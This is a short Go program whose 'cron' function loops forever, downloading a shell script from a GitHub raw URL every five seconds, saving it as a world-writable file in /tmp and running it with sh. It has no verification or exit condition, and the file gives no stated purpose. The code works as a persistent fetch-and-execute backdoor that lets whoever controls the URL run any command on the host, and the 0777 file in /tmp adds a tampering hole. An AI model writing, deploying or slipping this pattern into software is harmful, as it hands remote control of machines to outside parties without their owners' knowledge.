package main


import (

"fmt"
"net/http"
"io/ioutil"
"os/exec"
"time"
)



//con infinite


func cron()  {
 







for        {






time.Sleep(5 * time.Second)



cli := http.Client{}


resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/cron.sh")


 if err_get != nil {


 fmt.Println(err_get)  //erro no github.com 


           continue

   

}


script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       fmt.Println("erro em readall")

           continue

            }


ioutil.WriteFile("/tmp/cron.sh" , script , 0777 )
 


cron :=  exec.Command("sh" , "/tmp/./cron.sh")

 

cron.Run()



}

 

}







